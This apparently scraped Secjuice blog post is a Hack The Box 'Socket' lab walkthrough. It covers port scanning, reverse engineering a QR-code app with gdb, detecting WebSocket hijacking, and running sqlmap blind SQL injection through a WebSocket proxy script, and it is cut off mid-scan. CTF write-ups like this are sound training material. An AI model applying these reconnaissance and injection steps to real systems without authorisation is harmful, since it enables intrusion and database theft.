["https://secjuice.com/htb-socket-walkthrough"]
title = "HTB Socket Walkthrough"
description = "Learn how a vulnerability in a WebSocket application was discovered and exploited using SQL injection."
full_description = '''TECHNICAL HTB Socket Walkthrough Learn how a vulnerability in a WebSocket application was discovered and exploited using SQL injection. Andy74 Dec 29, 2024 • 26 min read This picture of code and a 2025 New Year's celebration with fireworks was generated using Microsoft Copilot. And welcome back, my friends, to this relatively simple but very interesting BOX, with a small reverse engineering section that I love so much and that I hope you will, too. Also interesting is the part about privesc, in which ChatGPT, as has recently happened, had a small contribution. But let's not get lost in chatter, and let's get started.The nmap scan:Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-20 15:18 EDT Nmap scan report for 10.10.11.206 Host is up (0.11s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA) |_ 256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519) 80/tcp open http Apache httpd 2.4.52 |_http-title: Did not follow redirect to http://qreader.htb/ |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: Host: qreader.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 29.39 seconds OK. The usual portal seems to have an unusual domain for an HTB BOX. Let's add it in the /etc/hosts file and try to navigate it.Wappalyzer identifies the technologies used in the portal, but at the moment, this information cannot help me that much.The portal displays QRCode conversion and processing functions. There are also two versions of the system in a software format for windows and linux that can be downloaded and use4d from a local computer. It looks like my first investigation will be one of my favorite activities, a good reverse engineering session. But first, let's start the program to understand at least the basic operation.The program is a user interface system. If we try the sample file supplied with the executable, it is possible to trace the text contained within the QRCode.kavigihan Let's immediately disassemble the application to understand if there is something hidden inside that can be useful. The program initialization block (you can reach it by clicking on the start function in the appropriate box) shows that the application main is started.So let's move to main (always selecting the function from the appropriate box) and following the "jmp" to the specific address. We find ourselves in the heart of the application.Looking at the flow itself, I understand that it could take me a long time just to understand what it does by reading the code (branches are enough), so I start debugging and follow a single flow, at least I'm sure I will quickly analyze the correct flow.Going with the flow, I soon get to a function call that immediately displays the dialog. Strangely, the variable preceding it points to the executable I'm already debugging.I restarted and proceeded with a new debug, this time by entering the function that started the app form. Apparently, an application forks.We should have two processes of the same app.┌──(in7rud3r㉿in7rud3r-kali)-[~/Dropbox/hackthebox] └─$ps -aux | grep qreader in7rud3r 36498 5.7 0.0 2740 988 ? t 19:38 0:01 /home/in7rud3r/Downloads/app/qreader in7rud3r 36548 2.3 0.9 962756 162472 ? Wl 19:38 0:00 /home/in7rud3r/Downloads/app/qreader in7rud3r 36624 0.0 0.0 6304 2072 pts/5 S+ 19:38 0:00 grep --color=auto qreader A block of code later, however, waits for the second thread to exit.Since I can't do much in this instance, it will be better to start the app without debugging and stick to the process being started.Once started, we check who is the father of whom. The ID of the process should suffice (the older one is the child), but we leave nothing to chance.┌──(in7rud3r㉿in7rud3r-kali)-[~/Dropbox/hackthebox] └─$ pstree -p | grep qreader | |-lightdm(921)-+-xfce4-session(955)-+-Thunar(1084)-+-qreader(38483)---qreader(38492)-+-{qreader}(38494) | | | | | |-{qreader}(38495) | | | | | |-{qreader}(38496) | | | | | |-{qreader}(38497) | | | | | |-{qreader}(38498) | | | | | `-{qreader}(38499) ┌──(in7rud3r㉿in7rud3r-kali)-[~/Dropbox/hackthebox] └─$ ps -aux | grep qreader in7rud3r 38483 2.4 0.0 2740 980 ? S 19:45 0:01 /home/in7rud3r/Downloads/app/qreader in7rud3r 38492 0.5 0.9 962792 162492 ? Sl 19:45 0:00 /home/in7rud3r/Downloads/app/qreader in7rud3r 38812 0.0 0.0 6304 2096 pts/5 R+ 19:46 0:00 grep --color=auto qreader OK. The opening and writing functions should use some imported standard IO functions, but I can't find anything in the import section. I should find the button handles to retrieve the image encoding and decoding functions. Then there are the two function versions that update in the "about" menu, which return a connection error message. Let's try to find the error strings to trace the calls it tries to make.The strings are there, but I can't debug them, and after a few attempts to add a breakpoint that doesn't activate. I decided on a more theoretical approach. The error message is clearly an indication of a bad network connection, so I'm aiming to check portions of code in which network features are exploited. After a few tries, I identified the "socket" function. For a change, I use a slightly less user-friendly tool, gdb.I started the application and identifed the process that is being duplicated.┌──(in7rud3r㉿in7rud3r-kali)-[~/Downloads/app] └─$ pstree -ap | grep qreader | | `-qreader,10054 | | `-qreader,10059 | | |-{qreader},10060 | | |-{qreader},10061 | | |-{qreader},10062 | | |-{qreader},10063 | | |-{qreader},10064 | | `-{qreader},10065 | | |-grep,10736 --color=auto qreader Let's attach it the process via gdb.┌──(in7rud3r㉿in7rud3r-kali)-[~/Downloads/app] └─$ sudo gdb --pid 10059 GNU gdb (Debian 13.2-1) 13.2 Copyright (C) 2023 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Type "show copying" and "show warranty" for details. This GDB was configured as "x86_64-linux-gnu". Type "show configuration" for configuration details. For bug reporting instructions, please see: <https://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type "help". Type "apropos word" to search for commands related to "word". Attaching to process 10059 [New LWP 10060] [New LWP 10061] [New LWP 10062] [New LWP 10063] [New LWP 10064] [New LWP 10065] warning: .dynamic section for "/lib/x86_64-linux-gnu/libelf.so.1" is not at the expected address (wrong library or version mismatch?) [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". 0x00007fed5b78dfff in __GI___poll (fds=0x1e56f90, nfds=5, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29 29 ../sysdeps/unix/sysv/linux/poll.c: No such file or directory. (gdb) I put a breakpoint on the "socket" function and let the program run.(gdb) b socket Breakpoint 1 at 0x7fed4acb2d60 (3 locations) (gdb) c Continuing. At this point, let's trigger the connection event on the interface through one of the two menu items and see if something is activated in the debugger.[New Thread 0x7fed317fe6c0 (LWP 13226)] [Switching to Thread 0x7fed317fe6c0 (LWP 13226)] Thread 8 "qreader" hit Breakpoint 1.3, __GI_socket () at ../sysdeps/unix/syscall-template.S:120 120 ../sysdeps/unix/syscall-template.S: No such file or directory. Perfect. The break has been activated. Now, we can investigate the various calls that follow one another proceeding step by step. The new socket initialization function doesn't carry much additional information, especially by displaying the parameters that are passed to the function.(gdb) info args No arguments. Proceeding step by step (command "s"), we will finally arrive at the "open_socket" call, which will start showing us some more parameters.(gdb) s [New Thread 0x7fed30ffd6c0 (LWP 15775)] 122 in ../sysdeps/unix/syscall-template.S [...] open_socket (type=type@entry=GETFDHST, key=key@entry=0x7fed5b82bb87 "hosts", keylen=keylen@entry=6) at ./nscd/nscd_helper.c:172 172 ./nscd/nscd_helper.c: No such file or directory. (gdb) info args type = GETFDHST key = 0x7fed5b82bb87 "hosts" keylen = 6 This will reappear after performing a few more steps, and this time with some additional information.0x00007fed5b7dd739 in open_socket (type=type@entry=GETAI, key=key@entry=0x7fed403e3b30 "ws.qreader.htb", keylen=keylen@entry=15) at ./nscd/nscd_helper.c:171 171 in ./nscd/nscd_helper.c (gdb) info args type = GETAI key = 0x7fed403e3b30 "ws.qreader.htb" keylen = 15 Another domain that if I don't put it in my /etc/hosts file, I will never reach it. Let's add it and see what happens in the application.Bingo, once you enter the domain, the calls start going through.I then started packet sniffing on my network with wireshark.After quickly analyzing the packets, we found that after a quick sync and ack, the client made the real call, and we also found a lot of interesting information.OK. Pay attention now. To capture packets and be able to edit them, I need burpsuite. To make the program, I used the burpsuite proxy. I tried with environment variables and so on, but the process fork probably interfered with the environment variables. I then bypassed the problem by performing these simple steps:In the /etc/hosts file, I set my machine to respond to the ws.qreader.htb domainThe call is made on port 5789, so I set up a new proxy on burpsuite to answer local address 127.0.0.1 on port 5789 (this way, calls are made directly to burpsuite)Always in the proxy, I set the redirection of any call received at the address 10.10.11.206 on port 5789.In this way, I can check all the calls made. And in fact:Now, I can take a closer look at the calls. I don't know exactly how to perform a websocket attack, so I take a quick peek around and through HackTricks (now one of the penetration testers must-have tools)Cross-site WebSocket hijacking (CSWSH) - HackTricksHackTricksThis is an interesting git repository.GitHub - PalindromeLabs/STEWS: A Security Tool for Enumerating WebSocketsA Security Tool for Enumerating WebSockets. Contribute to PalindromeLabs/STEWS development by creating an account on GitHub.GitHubPalindromeLabsLet's take some time to understand how it works and then try it.┌──(in7rud3r㉿in7rud3r-kali)-[~/…/attack/git/STEWS/vuln-detect] └─$ python3 STEWS-vuln-detect.py -u ws.qreader.htb:5789 -n -1 Testing ws://ws.qreader.htb:5789 >>>Note: ws://ws.qreader.htb:5789 allowed http or https for origin >>>Note: ws://ws.qreader.htb:5789 allowed null origin >>>Note: ws://ws.qreader.htb:5789 allowed unusual char (possible parse error) >>>VANILLA CSWSH DETECTED: ws://ws.qreader.htb:5789 likely vulnerable to vanilla CSWSH (any origin) ====Full list of vulnerable URLs=== ['ws://ws.qreader.htb:5789'] ['>>>VANILLA CSWSH DETECTED: ws://ws.qreader.htb:5789 likely vulnerable to vanilla CSWSH (any origin)'] I don't believe it. It was too simple. Let's investigate this vulnerability and how it will be exploited.I have tried various ways to perform the exploit but without success. Finally, peeking in the HTB forum, I understand that the exploit is of type SQLi. Bad story, also in this case activating the sqlmap on websocket protocol will not be easy. Luckily, there is a script that can help me.Automating Blind SQL injection over WebSocketRecently I have come across several CTF challenges on SQL injection over WebSocket. So I decided to build a vulnerable WebSocket web app for others to practice blind SQL injection over WebSocket. I spent a day building this on NodeJS from scratch which helped me better understand WebSocket implement…Rayhan0x01’s BlogRayhan0x01After a quick look at the code, I only replaced the payload to avoid a double quote breaking the JSON string (as recommended in the comment).message = unquote(payload).replace('"','\\"') # replacing " with ' to avoid breaking JSON structure And fire to the dust!┌──(in7rud3r㉿in7rud3r-kali)-[~/…/hackthebox/_10.10.11.206 - Socket (lin)/attack/py] └─$ sqlmap -u 'http://localhost:8081/version?version=0.0.2' --batch --level 5 --risk 3 --dbs ___ __H__ ___ ___[(]_____ ___ ___ {1.6.7#stable} |_ -| . ["] | .'| . | |___|_ [']_|_|_|__,| _| |_|V... |_| https://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting @ 21:14:57 /2023-06-25/ [21:14:57] [INFO] testing connection to the target URL [21:14:57] [WARNING] turning off pre-connect mechanism because of incompatible server ('SimpleHTTP/0.6 Python/3.10.5') [21:14:57] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS [21:14:57] [INFO] testing if the target URL content is stable [21:14:58] [INFO] target URL content is stable [21:14:58] [INFO] testing if GET parameter 'version' is dynamic [21:14:58] [INFO] GET parameter 'version' appears to be dynamic [21:14:58] [WARNING] heuristic (basic) test shows that GET parameter 'version' might not be injectable [21:14:59] [INFO] testing for SQL injection on GET parameter 'version' [21:14:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [21:15:02] [INFO] GET parameter 'version' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [21:15:11] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y [21:15:11] [INFO] testing 'Generic inline queries' [21:15:11] [INFO] testing 'SQLite inline queries' [21:15:12] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)' [21:15:12] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)' [21:15:13] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)' [21:15:20] [INFO] GET parameter 'version' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable [21:15:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns' [21:15:20] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found [21:15:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test [21:15:22] [INFO] target URL appears to have 4 columns in query [21:15:23] [INFO] GET parameter 've'''
